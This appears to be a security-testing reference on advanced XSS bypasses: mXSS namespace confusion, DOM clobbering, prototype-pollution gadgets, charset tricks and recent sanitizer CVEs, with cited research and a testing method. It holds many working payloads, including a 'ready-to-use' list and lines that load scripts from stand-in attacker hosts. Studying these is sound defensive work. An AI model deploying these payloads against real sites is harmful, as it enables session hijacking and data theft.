# 18 - Advanced Bypass Techniques (mXSS, DOM Clobbering, Prototype Pollution)

## Overview

This document covers three advanced exploitation classes that transform otherwise benign HTML or JavaScript into XSS attack vectors: mutation XSS (mXSS) exploits browser parsing differences to create malicious content from sanitized input, DOM clobbering overwrites JavaScript variables and API references through HTML element naming, and prototype pollution injects properties into JavaScript's prototype chain to enable XSS via gadgets in popular libraries. Additionally, character set manipulation techniques are covered that exploit encoding detection to smuggle payloads past security controls.

**Sources**: [Cure53 - mXSS Attacks (Original Paper)](https://cure53.de/fp170.pdf), [PortSwigger - DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution), [Sonar - Encoding Differentials](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)

---

## 1. Mutation XSS (mXSS)

### How Browsers Mutate HTML During Parsing

The HTML specification defines precise rules for how browsers construct the DOM tree from markup. When browsers encounter malformed or unusual markup, they "fix" it according to these rules. The problem arises when serializing the fixed DOM back to a string (via `innerHTML`) produces markup that, when re-parsed, yields a different DOM. This non-idempotency is the foundation of mXSS.

```
HTML String -> Browser Parser -> DOM Tree -> Serialization (innerHTML) -> HTML String'
                                                                          |
                                          DOM Tree' <- Browser Parser <- HTML String'
                                          (different from original DOM Tree!)
```

**Key insight**: If a sanitizer operates on the first DOM tree (safe), but the application serializes and re-inserts (causing a second parse), the resulting DOM tree may contain executable content.

**Source**: [s1r1us.ninja - mXSS 101](https://s1r1us.ninja/posts/mxss-101/), [Sonar mXSS Cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/explained/)

### innerHTML Read-Write Chains

The classic mXSS trigger pattern:

```javascript
// Application code that enables mXSS:
element.innerHTML = sanitizer.sanitize(userInput);

// Why it's vulnerable:
// 1. sanitizer.sanitize() parses input, creates DOM, checks it -> safe
// 2. sanitizer serializes the DOM back to a string
// 3. element.innerHTML = string -> browser parses AGAIN
// 4. The second parse may produce different results due to context changes

// Even worse - explicit round-trip:
let temp = document.createElement('div');
temp.innerHTML = userInput;
// ... sanitize temp.childNodes ...
element.innerHTML = temp.innerHTML;  // Serialized + re-parsed = mXSS risk
```

### Backtick Mutation (Historical)

Discovered by Yosuke Hasegawa in 2007 in Internet Explorer:

```html
<!-- Original input -->
<img alt=`onerror=alert(1)`>

<!-- IE serialization stripped backtick quotes: -->
<img alt=onerror=alert(1)>
<!-- Resulting in an active onerror handler -->
```

While backtick-specific mutations are now patched, the principle of attribute quote handling differences remains relevant.

### Namespace Confusion (Primary Modern Technique)

HTML, SVG, and MathML have different parsing rules. The critical difference: in the HTML namespace, `<style>` content is raw text (not parsed as HTML). In SVG/MathML namespaces, `<style>` children are parsed as XML elements.

```html
<!-- Namespace confusion mXSS -->
<svg><style><a id="</style><img src=x onerror=alert(1)>"></style></svg>

<!-- Parse #1 (by sanitizer): -->
<!-- svg -> style -> [element: a with id attribute] -> safe! -->

<!-- Serialization: writes the content including the id value literally -->

<!-- Parse #2 (innerHTML): -->
<!-- svg is foreign, but style is interpreted in HTML context -->
<!-- Browser sees </style> inside the id value as closing the style tag -->
<!-- <img src=x onerror=alert(1)> is now live HTML -> XSS! -->
```

**MathML-specific namespace confusion (DOMPurify < 2.0.17)**:

```html
<math><mtext><table><mglyph><svg><mtext>
<style><path id="</style><img src=x onerror=alert(1)>">
</mtext></svg></mglyph></table></mtext></math>

<!-- mglyph and malignmark are special: they are MathML elements when -->
<!-- direct children of MathML text integration points, but HTML elements -->
<!-- otherwise. This namespace ambiguity causes parsing divergence. -->
```

**Source**: [Securitum - Mutation XSS via MathML](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/), [Daniel Santos - SVG Namespace Confusion](https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f)

### Serialization-Reparsing Deep Dive

Specific serialization behaviors that cause mutation:

```html
<!-- 1. Comment serialization difference -->
<!-- In HTML: <!-- comment --> is a comment -->
<!-- In SVG/MathML: comments may be treated differently -->
<svg><!--<img src=x onerror=alert(1)>--></svg>

<!-- 2. CDATA sections -->
<!-- CDATA is valid in SVG/MathML but not HTML -->
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<!-- Serialization may output without CDATA markers -->

<!-- 3. Processing instructions -->
<svg><?pi <img src=x onerror=alert(1)>?></svg>

<!-- 4. Nesting depth limits -->
<!-- Deeply nested elements may be reorganized during parsing, -->
<!-- changing the namespace context of inner elements -->
```

### Recent Research (2023-2025)

**DOMPurify <= 3.1.0 bypass (April 2024, @IceFont)**: Full bypass using novel mutation concepts involving new combinations of namespace switching and tree construction algorithm quirks.

**CVE-2024-47875 - Nesting-based mXSS (October 2024)**: Nested math/annotation-xml/SVG structures caused the sanitizer tree to differ from the browser re-parse tree. CVSS 10.0.

**DOMPurify <= 3.2.3 - Template Literal Regex Flaw**: A flaw in the regular expression used to detect template literals allowed crafted strings to bypass the check and result in mXSS.

**Source**: [GitHub Advisory GHSA-gx9m-whjm-85jf](https://github.com/advisories/GHSA-gx9m-whjm-85jf), [Mizu.re - DOMPurify Bypasses](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)

---

## 2. DOM Clobbering

### Named Access on the Window Object

The HTML specification defines "named access" on the Window object: elements with `id` or `name` attributes become accessible as properties of `window`. This is the foundation of DOM clobbering.

```html
<!-- If JavaScript code does: if (window.config) { ... } -->
<!-- An attacker can create: -->
<img id="config">
<!-- Now window.config returns the <img> element instead of undefined -->

<!-- For nested property access like window.config.url: -->
<a id="config" href="javascript:alert(1)">
<!-- window.config.href -> "javascript:alert(1)" (via HTMLAnchorElement.href) -->
<!-- window.config.toString() -> "javascript:alert(1)" -->
```

### Form Element Clobbering

Forms provide multi-level clobbering because form elements can be accessed by name:

```html
<!-- Clobber window.x.y using a form -->
<form id="x">
  <input name="y" value="clobbered">
</form>
<!-- window.x.y -> <input> element -->
<!-- window.x.y.value -> "clobbered" -->

<!-- Three levels deep: window.x.y.z -->
<form id="x" name="y">
  <input name="z" value="payload">
</form>

<!-- Clobber form.attributes to bypass sanitizers -->
<form id="target">
  <input name="attributes">
</form>
<!-- form.attributes now returns the <input> element -->
<!-- Sanitizers that iterate form.attributes will fail -->
```

**Source**: [HackTricks - DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering), [Beyond XSS - DOM Clobbering Introduction](https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/)

### Iframe Clobbering

Iframes create separate windows that can be used for deeper clobbering chains:

```html
<!-- If allowed by sanitizer (e.g., with srcdoc): -->
<iframe name="x" srcdoc="<a id='y' href='javascript:alert(1)'>"></iframe>
<!-- window.x.y -> the anchor element in the iframe -->
<!-- window.x.y.href -> "javascript:alert(1)" -->
<!-- window.x.y.toString() -> "javascript:alert(1)" -->

<!-- Without srcdoc, using name: -->
<iframe id="x" name="x"></iframe>
<!-- window.x -> the iframe's contentWindow -->
```

### Collection Clobbering

When multiple elements share the same `id`, browsers create an HTMLCollection:

```html
<a id="x" href="first">
<a id="x" href="second">
<!-- document.getElementById("x") -> first <a> -->
<!-- window.x -> HTMLCollection [a, a] -->
<!-- window.x[0] -> first <a> element -->
<!-- window.x[1] -> second <a> element -->

<!-- Named items in collection: -->
<a id="x" name="y" href="payload1">
<a id="x" name="z" href="payload2">
<!-- window.x.y -> first <a> (accessible by name within collection) -->
<!-- window.x.z -> second <a> -->
```

### DOM Clobbering to XSS Chains

**Chain 1: Clobbering a script source URL**

```javascript
// Vulnerable code:
let config = window.config || {};
let scriptUrl = config.cdnUrl || 'https://default-cdn.com/app.js';
let s = document.createElement('script');
s.src = scriptUrl;
document.body.appendChild(s);
```

```html
<!-- Attack: clobber window.config to control script URL -->
<a id="config" href="https://attacker.com/evil.js">
<!-- config.toString() -> "https://attacker.com/evil.js" -->
<!-- The OR operator falls through because config is truthy (element) -->
<!-- But config.cdnUrl is undefined, so scriptUrl = "https://default-cdn.com/app.js" -->

<!-- Better approach with form: -->
<form id="config"><input name="cdnUrl" value="https://attacker.com/evil.js"></form>
<!-- Now config.cdnUrl.value -> "https://attacker.com/evil.js" -->
```

**Chain 2: Clobbering sanitizer configuration**

```javascript
// If sanitizer reads config from the DOM:
let allowedTags = window.sanitizerConfig?.allowedTags;
```

```html
<img id="sanitizerConfig">
<!-- sanitizerConfig is now an element, allowedTags is undefined -->
<!-- May cause the sanitizer to fail open (allow everything) -->
```

**Chain 3: Real-world Astro ViewTransitions (2024 CVE)**

```html
<!-- Astro's client-side router with ViewTransitions was vulnerable -->
<!-- to DOM clobbering via name attributes on scriptless HTML tags -->
<!-- Similar: Webpack CVE-2024-43788, Vite CVE-2024-45812, layui CVE-2024-47075 -->
```

**Source**: [buer.haus - DOM Clobbering Exploit in the Wild (2024)](https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/), [Astro Security Advisory GHSA-m85w-3h95-hcf9](https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9), [PortSwigger - DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)

---

## 3. Prototype Pollution to XSS

### How Prototype Pollution Enables XSS

JavaScript objects inherit properties from their prototype chain. If an attacker can write to `Object.prototype`, every object in the application inherits those properties. When application code or library code reads an unset property, it traverses the prototype chain and finds the attacker's value.

```javascript
// Pollution via __proto__:
const obj = JSON.parse('{"__proto__": {"polluted": true}}');
merge({}, obj);  // Vulnerable merge function
console.log({}.polluted);  // true - every object is now affected

// Pollution via constructor.prototype:
obj['constructor']['prototype']['polluted'] = true;

// Common pollution sources:
// - URL query parameters: ?__proto__[polluted]=true
// - JSON body: {"__proto__": {"polluted": "value"}}
// - URL hash: #__proto__[polluted]=true
// - postMessage data
```

### Gadgets in jQuery

jQuery has multiple prototype pollution gadgets:

```javascript
// jQuery event delegation
// jQuery uses $.event.special for event handling
// Polluting this object can inject event handlers

// jQuery .attr() with no value
Object.prototype.onclick = 'alert(1)';
// $('div').attr('onclick'); may read from prototype

// Real-world exploitation (Intigriti 0124 challenge):
// jQuery 3.6.x $.extend() with crafted location.hash
// location.hash = '#__proto__[test]=test'
// $.extend(true, {}, hashParams) -> pollutes Object.prototype
```

**Source**: [Johan Carlsson - Hunting for PP Gadgets in jQuery](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/), [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

### Gadgets in Lodash

```javascript
// Lodash vulnerable functions:
// _.merge(), _.mergeWith(), _.defaultsDeep(), _.set(), _.setWith()

// CVE-2019-10744: lodash < 4.17.12
_.defaultsDeep({}, JSON.parse('{"__proto__": {"polluted": true}}'));

// Gadget: If lodash is used with a template engine:
Object.prototype.sourceURL = '\nalert(1)//';
// Lodash template compilation includes sourceURL in generated function
// _.template('hello')();  // Triggers alert(1)

// Gadget: template settings
Object.prototype.variable = 'x=alert(1)//';
```

### Server-Side to Client-Side Chains

```javascript
// 1. Server-side prototype pollution persists in SSR output
// If Node.js server uses vulnerable merge on user input:
// Server: merge(config, userInput) -> Object.prototype polluted
// SSR renders HTML with polluted values -> sent to client

// 2. Polluted config object serialized to client:
// Server sends window.CONFIG = ${JSON.stringify(config)} in a script tag
// If config was built from a polluted prototype, it may contain attack values

// 3. postMessage relay:
// Server app reflects pollution via WebSocket/SSE -> client reads and applies
```

### Scanning for Gadgets

```javascript
// Manual scanning approach:
// 1. Pollute Object.prototype with a known marker
Object.prototype.__PP_TEST__ = 'POLLUTED';

// 2. Search for code that reads undefined properties:
// - obj.propertyThatMayNotExist
// - obj[dynamicKey]
// - Destructuring with defaults: const { x = defaultVal } = obj;

// 3. Check if polluted value reaches a dangerous sink:
// - innerHTML, outerHTML
// - document.write()
// - Function constructor
// - script.src, iframe.src
// - element.setAttribute('onclick', ...)

// Automated tools:
// ppfuzz - fuzzes for client-side prototype pollution
// ppmap - maps prototype pollution to known gadgets
// protoStalker - Chrome DevTools plugin for real-time monitoring
```

```bash
# ppfuzz usage:
ppfuzz -l urls.txt -w wordlist.txt

# ppmap usage (finds gadgets after confirming pollution):
ppmap -u "https://target.com/?__proto__[test]=test"

# Nuclei prototype pollution templates:
nuclei -u https://target.com -t prototype-pollution/
```

**DOMPurify Prototype Pollution (CVE-2024-45801)**:

```javascript
// DOMPurify <= 3.0.8 was vulnerable to prototype pollution
// Polluting Node.prototype.after could bypass sanitization
// Fixed by using Object.hasOwn() checks and Object.create(null) for internal maps
```

**Source**: [Beyond XSS - Prototype Pollution](https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/), [s1r1us.ninja - Prototype Pollution](https://blog.s1r1us.ninja/research/PP), [HackTricks - Client-Side Prototype Pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html)

---

## 4. Character Set Tricks

### UTF-16 BOM (Byte Order Mark) Override

The WHATWG HTML specification defines BOM sniffing that takes precedence over any declared charset:

```
UTF-8 BOM:    EF BB BF
UTF-16 BE BOM: FE FF
UTF-16 LE BOM: FF FE
```

```javascript
// If an attacker can inject a BOM at the beginning of a document:
// The browser ignores Content-Type charset and uses the BOM-indicated encoding

// Attack scenario: user input reflected at the very start of a page
// Inject 0xFF 0xFE (UTF-16 LE BOM) followed by a UTF-16 LE encoded payload
// The browser switches to UTF-16 LE interpretation for the entire page
```

**Source**: [elmosalamy - BOM Sniffing to XSS](https://blog.elmosalamy.com/posts/bom-sniffing-to-xss/)

### Charset Mismatch Attacks

When the server declares one charset but the content uses another, sanitizers and the browser may interpret the content differently:

```html
<!-- Server sends: Content-Type: text/html; charset=utf-8 -->
<!-- But content contains UTF-16 encoded payload -->
<!-- If the browser re-detects charset (BOM sniffing), it may interpret differently -->

<!-- Classic UTF-7 mismatch (legacy) -->
<!-- Content-Type: text/html (no charset declared) -->
<!-- Page content: +ADw-script+AD4-alert(1)+ADw-/script+AD4- -->
<!-- If browser detects UTF-7, this executes as <script>alert(1)</script> -->

<!-- Encoding differential: sanitizer decodes as UTF-8, browser as ISO-8859-1 -->
<!-- Multi-byte UTF-8 sequences may be interpreted as different characters -->
```

**Source**: [Sonar - Encoding Differentials](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)

### Encoding Detection Confusion

```html
<!-- Meta charset override within the first 1024 bytes -->
<meta charset="utf-16be">
<!-- Forces the browser to reinterpret the rest of the page as UTF-16 BE -->
<!-- In UTF-16 BE, each ASCII char is preceded by a null byte: \x00A = 'A' -->

<!-- If the attacker controls content early in the page: -->
<meta http-equiv="Content-Type" content="text/html; charset=utf-7">
<!-- Forces UTF-7 interpretation (older browsers) -->

<!-- ISO-2022-JP charset switching -->
<!-- Uses escape sequences to switch between ASCII and JIS X 0208 -->
<!-- Can be used to encode XSS payloads that bypass ASCII-based filters -->
```

### RTL Override and Bidi Attacks

```html
<!-- Right-to-Left Override (U+202E) can visually hide payloads -->
<!-- The character reverses the visual display order without changing the logical order -->

<!-- Example: make "tpircs" display as "script" visually -->
<!-- But the actual characters in the DOM are reversed -->

<!-- More practically, RLO can confuse human reviewers: -->
<!-- filename.&#x202E;gpj.exe appears as filename.exe.jpg -->

<!-- In XSS context: -->
<!-- Inject RLO to make a payload look benign to moderators -->
<!-- The browser still executes the logical character order -->

<!-- Bidi text can also break WAF regex patterns: -->
<script>&#x200F;alert(1)</script>
<!-- The RLM character may interfere with regex matching -->
```

---

## 5. Advanced Bypass Payloads (20+ Ready-to-Use)

### mXSS Payloads

```html
<!-- 1. SVG style namespace confusion -->
<svg><style><a id="</style><img src=x onerror=alert(1)>"></style></svg>

<!-- 2. MathML namespace confusion -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>

<!-- 3. Math annotation-xml namespace switch -->
<math><annotation-xml encoding="text/html"><svg><style><!--</style><img src=x onerror=alert(1)>--></style></svg></annotation-xml></math>

<!-- 4. SVG foreignObject mXSS -->
<svg><foreignObject><math><annotation-xml encoding="text/html"><style></style><img src=x onerror=alert(1)></annotation-xml></math></foreignObject></svg>

<!-- 5. Nesting depth mXSS -->
<math><mtext><table><mglyph><svg><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></svg></mglyph></table></mtext></math>

<!-- 6. Comment-based mXSS -->
<svg><style><!--</style><img src=x onerror=alert(1)>--></style></svg>
```

### DOM Clobbering Payloads

```html
<!-- 7. Basic property clobbering -->
<img id="x" name="alert">
<!-- window.x exists, can affect code that checks for window.x -->

<!-- 8. Form-based two-level clobbering -->
<form id="config"><input name="debug" value="true"></form>
<!-- window.config.debug -> <input> (truthy) -->

<!-- 9. Anchor href clobbering for URL injection -->
<a id="config" href="javascript:alert(1)">
<!-- If code does: location = config; -> XSS -->

<!-- 10. Collection clobbering -->
<a id="x" name="url" href="https://evil.com/payload.js">
<a id="x" name="type" href="module">
<!-- window.x.url and window.x.type accessible -->

<!-- 11. Iframe clobbering for deep access -->
<iframe name="config" srcdoc="<a id='apiUrl' href='//evil.com'>"></iframe>
<!-- window.config.apiUrl.href -> "//evil.com" -->

<!-- 12. Sanitizer config clobbering -->
<img id="__DOMPurify_config">
<!-- May interfere with DOMPurify's internal configuration checks -->

<!-- 13. attributes property clobbering on form -->
<form id="target"><input name="attributes"></form>
<!-- target.attributes returns <input> instead of NamedNodeMap -->
```

### Prototype Pollution to XSS Payloads

```javascript
// 14. Lodash template sourceURL gadget
Object.prototype.sourceURL = '\nalert(1)//';
// Any lodash template compilation triggers XSS

// 15. jQuery event special gadget
Object.prototype.onclick = 'alert(1)';
// Affects dynamically created elements

// 16. Vue.js template injection via pollution
Object.prototype.template = '<img src=x onerror=alert(1)>';
// Vue components without explicit template may inherit

// 17. Webpack chunk loading
Object.prototype.src = 'https://evil.com/chunk.js';
// Polluted src may be used when loading dynamic chunks

// 18. Generic innerHTML gadget
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
// Any code that reads obj.innerHTML on an unpopulated property
```

### Character Set Attack Payloads

```html
<!-- 19. UTF-16 BOM injection -->
<!-- Inject bytes: FF FE at document start, followed by UTF-16 LE XSS -->
<!-- Requires control over the very beginning of the response -->

<!-- 20. UTF-7 payload (requires charset=utf-7 or no charset) -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- 21. Meta charset override -->
<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- 22. ISO-2022-JP escape sequence -->
<!-- Uses ESC sequences to switch character sets mid-stream -->
<!-- \x1B(J triggers JIS X 0201 Roman, \x1B$@ triggers JIS X 0208 -->

<!-- 23. Encoding differential payload -->
<!-- Craft bytes that are benign in UTF-8 but form XSS in ISO-8859-1 -->
<!-- Or bytes that the sanitizer interprets as one charset but browser as another -->

<!-- 24. RTL override visual disguise -->
<script>&#x200F;&#x202E;alert(1)</script>
```

---

## Testing Methodology

### mXSS Testing

1. **Identify innerHTML sinks**: Search for `element.innerHTML =`, `.insertAdjacentHTML()`, jQuery `.html()`, `.append(htmlString)`
2. **Test namespace payloads**: Systematically try SVG, MathML, and annotation-xml wrappers
3. **Test nesting depth**: Increase nesting levels of math/svg/table/mglyph combinations
4. **Check serialization**: Compare `element.innerHTML` output after assignment vs. the original input
5. **Test sanitizer version**: Match known CVEs to the deployed sanitizer version

### DOM Clobbering Testing

1. **Identify global variable checks**: Search for `window.x`, `typeof x !== 'undefined'`, `x || default`
2. **Identify named form access**: Search for code accessing form elements by name
3. **Test with id/name injection**: Create elements with `id` matching critical variable names
4. **Verify XSS chain**: Confirm the clobbered value reaches a dangerous sink
5. **Test sanitizer interaction**: Check if the sanitizer's own config or DOM access is clobberable

### Prototype Pollution Testing

```bash
# Test for pollution source:
# URL: https://target.com/?__proto__[test]=polluted
# Verify: Open console, check {}.test === "polluted"

# Test for pollution via hash:
# URL: https://target.com/#__proto__[test]=polluted

# Test for pollution via JSON body:
curl -X POST https://target.com/api -H 'Content-Type: application/json' \
  -d '{"__proto__": {"test": "polluted"}}'

# Scan for known gadgets:
ppmap -u "https://target.com/?__proto__[test]=test"
```

### Character Set Testing

1. **Check charset declaration**: Look for `Content-Type` header and `<meta charset>` tag
2. **Test BOM injection**: If input is reflected at the start of the page, inject BOM bytes
3. **Test charset override**: Try `<meta charset="utf-7">` if reflected early in the document
4. **Test encoding differentials**: Submit multi-byte sequences that decode differently across charsets
5. **Check for auto-detection**: If no charset is declared, the browser will auto-detect, which is exploitable

---

## References

- [Cure53 - mXSS Attacks: Original Research Paper](https://cure53.de/fp170.pdf)
- [s1r1us.ninja - mXSS Evolution and Timeline](https://s1r1us.ninja/posts/mxss-101/)
- [Sonar - mXSS Cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/explained/)
- [msrkp/MXSS GitHub - Awesome mXSS Collection](https://github.com/msrkp/MXSS)
- [Securitum - Mutation XSS via MathML](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- [Securitum - DOMPurify 2.0.0 Bypass](https://research.securitum.com/dompurify-bypass-using-mxss/)
- [Mizu.re - DOMPurify Bypasses and Fixes](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
- [PortSwigger - DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [OWASP - DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [HackTricks - DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [Beyond XSS - DOM Clobbering Introduction](https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/)
- [buer.haus - DOM Clobbering Exploit in the Wild (2024)](https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/)
- [Astro Security Advisory - GHSA-m85w-3h95-hcf9](https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9)
- [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [Beyond XSS - Prototype Pollution](https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/)
- [HackTricks - Client-Side Prototype Pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html)
- [Johan Carlsson - PP Gadgets in jQuery](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/)
- [Sonar - Encoding Differentials](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- [elmosalamy - BOM Sniffing to XSS](https://blog.elmosalamy.com/posts/bom-sniffing-to-xss/)
- [GitHub Advisory - CVE-2024-47875](https://github.com/advisories/GHSA-gx9m-whjm-85jf)

---
## [2024-2026 Research Update]

### New mXSS Bypass Techniques

**CVE-2024-47875 (GHSA-gx9m-whjm-85jf, October 2024) - Nesting-Based mXSS via form/math/mtext/table/mglyph/style Chain**

Reported by @icesfont. Root cause: flattening, foreign-content repair, and serialization instability combined to produce executable markup after reparse. DOMPurify added a depth cap in 3.1.1 and later removed it in 3.1.5.

```html
<form><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**CVE-2025-26791 (2025) - Template Reassembly Bypass**

Removing elements and merging text nodes rebuilt a template expression. Incorrect `${ ... }` handling during node removal.

```html
<div id=app>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>
```

**CVE-2026-0540 (2026) - Rawtext/RCDATA Breakout**

SAFE_FOR_XML attribute regex omitted rawtext element names.

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**CVE-2026-47423 (2026) - selectedcontent Element Bypass (Chrome 130+)**

Browser re-clones option content after the sanitizer's walk, reintroducing unsanitized nodes.

```html
<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
```

**CVE-2026-49978 (2026) - IN_PLACE Shadow Root Bypass**

Content inside a template's shadow root was skipped during IN_PLACE sanitization. All versions before 3.4.7 affected.

**Declarative Partial Updates mXSS (Chrome 150, 2026)**

Template elements with `for` attribute can patch named markers in the DOM:

```html
<svg><?marker name="x"></svg><template for="x"><style><img src onerror=alert()></style></template>
```

### New Prototype Pollution to XSS Chain

**CVE-2026-41238 (GHSA-v9jr-rg53-9pgp, 2026) - DOMPurify CUSTOM_ELEMENT_HANDLING Fallback**

After prototype pollution sets `Object.prototype.tagNameCheck = /.*/` and `Object.prototype.attributeNameCheck = /.*/`, an inherited `|| {}` fallback in the CUSTOM_ELEMENT_HANDLING code path allows arbitrary custom elements with event handlers through the sanitizer. Affected 3.0.1 through 3.3.3. Fixed in 3.4.0.

```javascript
// Step 1: Exploit any upstream prototype pollution vulnerability
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;

// Step 2: DOMPurify now passes custom elements with event handlers
DOMPurify.sanitize('<x-x autofocus tabindex=0 onfocus=alert(1)>');
// Returns: <x-x autofocus="" tabindex="0" onfocus="alert(1)"></x-x>
```

This is particularly dangerous because it converts any non-XSS prototype pollution bug in the application stack into a full XSS.

**Source**: [GitHub Advisory GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)

### New DOMPurify Configuration Pitfalls

**ADD_TAGS function-form bypassing FORBID_TAGS (pre-3.4.0):**

A function-form ADD_TAGS can let tags that FORBID_TAGS lists through. A condition returns early when the tag check passes, so the forbid check never runs.

```javascript
// Vulnerable configuration
DOMPurify.sanitize('<iframe src="https://evil.example">', {
  ADD_TAGS: () => true,
  FORBID_TAGS: ['iframe']
});
// Result: iframe passes through despite being forbidden
```

**Stale ADD_TAGS/ADD_ATTR state:**

Function predicates passed through ADD_ATTR or ADD_TAGS persist on a DOMPurify instance across later sanitize() calls. A later call passing an array does not clear the function handler. Only constructing a new instance clears it.

**CUSTOM_ELEMENT_HANDLING with broad regex:**

Using `tagNameCheck: /.*/` with `allowCustomizedBuiltInElements: true` allows all custom elements through, including those with dangerous event handlers.

### Browser-Native Sanitizer API Bypass Techniques

**CVE-2026-7939 (May 2026) - Chrome Sanitizer API UXSS**

Inappropriate implementation in SanitizerAPI in Google Chrome before 148.0.7778.96. Severity: Medium (Google), CVSS 3.1 score 5.4. Allows remote attacker to inject scripts or HTML via crafted HTML page. Fixed in Chrome 148.0.7778.96.

**Source**: [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-7939)

**Two Chrome Sanitizer API bypasses (Chrome 146):**

Security researchers at Searchlight Cyber (Adam Kues) reported two bypasses in Chrome's Sanitizer API implementation. The empty configuration (`new Sanitizer({})`) is the most permissive configuration but should still block scripts. The bypasses demonstrate that even browser-native implementations are not immune to implementation bugs.

**Source**: [Searchlight Cyber](https://www.slcyber.io/research/two-bypasses-for-chromes-sanitizer-api)

### HTML Spec Serialization Change Impact on mXSS

The HTML specification was updated on May 20, 2025 to escape `<` and `>` in attribute values during serialization (innerHTML, outerHTML, getHTML()). Landed in Chrome 138 (stable June 24, 2025), Firefox 140, and Safari 26 beta.

This directly eliminates the class of mXSS where unescaped angle brackets in attribute values produce different parse trees on reparse, but does NOT address namespace confusion, depth-limit flattening, or foster-parenting attacks.

**Source**: [Chrome Developer Blog](https://developer.chrome.com/blog/escape-attributes)

### Updated References

- [DOMPurify Wiki - Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)
- [GitHub Advisory GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)
- [NVD - CVE-2026-7939](https://nvd.nist.gov/vuln/detail/CVE-2026-7939)
- [Searchlight Cyber - Chrome Sanitizer API Bypasses](https://www.slcyber.io/research/two-bypasses-for-chromes-sanitizer-api)
- [Chrome Developer Blog - Escape Attributes](https://developer.chrome.com/blog/escape-attributes)
- [CASA RUB - Parse Me Baby One More Time](https://casa.rub.de/forschung/publikationen/detail/parse-me-baby-one-more-time-bypassing-html-sanitizer-via-parsing-differentials)

---

## [2026 API XSS Research Update]

### HTTP Parameter Pollution (HPP) Bypass Techniques

Bruno Mendes (Ethiack, August 2025) demonstrated HPP bypassed **14 of 17 major WAF configurations** (82% bypass rate). The technique exploits divergent parameter parsing between WAFs and backend frameworks:

**Framework-specific behaviors:**
- **ASP.NET**: `HttpUtility.ParseQueryString()` concatenates duplicate values with commas -- combined with JavaScript's comma operator, split payloads reassemble: `?q=alert&q=(1)` becomes `alert,(1)` which executes via comma operator
- **PHP**: Takes the last parameter value
- **Apache Tomcat**: Uses the first value
- **Node.js Express**: Creates arrays from duplicate params (type confusion when rendered as string)

The divergence between WAF parameter parsing and backend framework parsing is the root cause. WAFs inspect each parameter value individually and see benign fragments; the backend concatenates or selects differently, assembling the complete XSS payload.

**Source:** [Ethiack Blog](https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution)

### Encoding Bypass Chains

**Double URL Encoding:**
`<` becomes `%3C` after one encode and `%253C` after two. The first decoding by the HTTP layer produces `%3C`, which passes a filter checking for literal `<`. The application then decodes `%3C` to `<` at render time. This works against WAFs that decode once before inspection but the application decodes again.

**Unicode NFKC Normalization:**
Fullwidth Unicode characters (e.g., U+FF1C `<` for `<`, U+FF1E `>` for `>`) pass WAF inspection in raw form. The application normalizes using NFKC, which decomposes fullwidth characters to ASCII equivalents. WAFs must normalize input using NFKC before signature matching to close this vector.

**JSON Unicode Escapes:**
